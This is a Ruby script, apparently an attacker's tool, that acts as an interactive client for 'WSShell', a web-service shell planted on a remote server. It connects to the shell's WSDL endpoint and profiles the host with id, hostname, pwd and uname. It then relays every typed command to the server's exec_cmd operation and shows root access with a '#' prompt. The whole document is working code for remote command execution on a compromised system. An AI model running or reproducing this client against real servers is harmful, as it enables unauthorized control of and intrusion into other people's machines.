#!/usr/bin/ruby

# Author: @felmoltor
# Summary: This script is just a client for the WSShell globaly deployed Web Service Shell.
# Date: 10/2013

# TODO: Encode response in base64
# TODO: Bug with Axis2. Change the requests headers it an Axis2 is using <base> tag to redirect to an internal IP. Configure endpoint on client.

require 'uri'
require 'savon'
require 'optparse'

class WSShellClient
    attr_accessor :username, :hostname, :path, :userid, :got_shell
    @wsdlShellURL = nil
    @outputLog = "shell_access.log"

    def initialize(wsdlwsshellurl=nil, outputlog="shell_access.log")
        @wsdlShellURL = wsdlwsshellurl
        @outputLog = outputlog
        @username = "<NO_USER>"
        @userid = -1
        @hostname = "<NO_HOSTNAME>"
        @path = "<NO_PATH>"
        @currentpath=@path
        @got_shell = true
        begin
            @wsshellclient = Savon.client(wsdl: @wsdlShellURL, endpoint: @wsdlShellURL.gsub(/\?wsdl$/,""))
            # Check if the wsdl endpoint is public. If not, force the public endpoint
            # TODO: Set the endpoint changing only private IP to public IP, but for now we will only copy the
            #       WSDL URL without ending in "wsdl".
            # @wsshellclient.endpoint = @wsdlShellURL.gsub(/\?wsdl$/,"")
            @wsshellclient.globals[:logger] = Logger.new(@outputLog)
            @wsshellclient.globals[:log] = true
            getCurrentContext
        rescue Wasabi::Resolver::HTTPError => e
            $stderr.puts "Error retrieving the WSDL file from #{@wsdlShellURL}: #{e.message}"
            @wsshellclient = nil
            @got_shell = false
        end
     end
    
    #exec_cmd, get_file_list, get_info, get_root_dir, read_file

    def executeCommand(cmd)
        m = cmd.strip.match(/^cd (.*)/)
        if (!m.nil? and !m[1].nil?)
            # puts "STUB: Changing directory [FAKE MODE]"
            @currenpath=m[1]
            response =  @wsshellclient.call(:exec_cmd, message: {cmd: cmd})
            # TODO: Check if the cd was success or not
        else
            # TODO: Before executing any command, cd to @currentpath
            # puts "STUB: before executing #{cmd} changing to #{@currentpath} [FAKE MODE]"
            response = @wsshellclient.call(:exec_cmd, message: {cmd: cmd})
        end
        return response.body[:exec_cmd_response][:return]
    end

    def getRawAvailableFunctions
        response = "\n#{@wsshellclient.operations.sort.join("\n")}"
        return response
    end

    def getSystemInfo
        response = @wsshellclient.call(:get_info)
        return response.body[:get_info_response][:return]
    end
    
    def getIdInfo
        # uid=1000(harvester) gid=1001(harvester) groups=1001(harvester),27(sudo),1000(vboxsf)
        idoutput=executeCommand("id")
        ida = idoutput.split(' ')
        @userid=ida[0].split('=')[1].split('(')[0]
        @username=ida[0].split('=')[1].split('(')[1].gsub(")","")
    end

    def getCurrentContext
        getIdInfo
        @shell=executeCommand("echo $SHELL")
        @path=executeCommand("pwd")
        @hostname=executeCommand("hostname")
    end

end

#####################

########
# MAIN #
########

if ARGV[0].nil?
    puts "Error: Se necesita la URL del wsdl de la WSShell"
    exit(1)
end

wsdl = ARGV[0]

wsdluri = URI(wsdl)

wsshell = WSShellClient.new(wsdlwsshellurl = wsdl, outputlog = "wsshell_#{DateTime.now.strftime("%Y%m%d_%H%M%S")}_#{wsdluri.host}_#{wsdluri.port}.log")

if wsshell.got_shell 
    sys = wsshell.executeCommand('uname -a')
    puts "="*(sys.size+4)
    puts "= #{sys} ="
    puts "="*(sys.size+4)
    puts 
    puts " ********************************************************************"
    puts " * WARNING: This is not a real shell (WSShell is a shit...), thus,  *"
    puts " * you won't be able to do a lot of things like:                    *"
    puts " * - Change the directory with a cd                                 *"
    puts " * - Concatenate commands with operators like '||' or '&&' or ';',  *"
    puts " *    the server will ignore it                                     *"
    puts " * - Redirect outputs with operators like '>' or '<'                *"
    puts " * - echo environment variables (echo $USERNAME won't work)         *"
    puts " * - All those functionalities can be \"added\" with WSShell2 (TODO)*"
    puts " ********************************************************************"
    puts 

    while(1)
        wsshell.getCurrentContext
        psterm = "$"
        if wsshell.userid.to_i == 0
            psterm = "#"
        end
        print "#{wsshell.username}@#{wsshell.hostname}:#{wsshell.path}#{psterm} "
        c = $stdin.gets.strip
        if c != "exit"
            if c.to_s.size > 0
                puts wsshell.executeCommand(c)
            end
        else
            puts "Bye, bye..."
            break
        end
    end
end
